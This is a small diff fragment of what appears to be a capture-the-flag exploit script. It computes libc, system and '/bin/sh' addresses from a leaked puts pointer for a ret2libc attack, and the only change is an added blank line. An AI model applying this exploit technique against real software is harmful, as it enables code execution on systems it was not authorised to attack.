@@ -29,6 +29,7 @@ puts_leak         = u64(p.read(6) + "\x00\x00")
 libc_base_address = puts_leak - PUTS_OFFSET
 system_address    = libc_base_address + SYSTEM_OFFSET
 bin_sh_address    = libc_base_address + BIN_SH_OFFSET
+
 log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
 log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
 log.info("found system address: 0x{:>8x}".format(system_address))
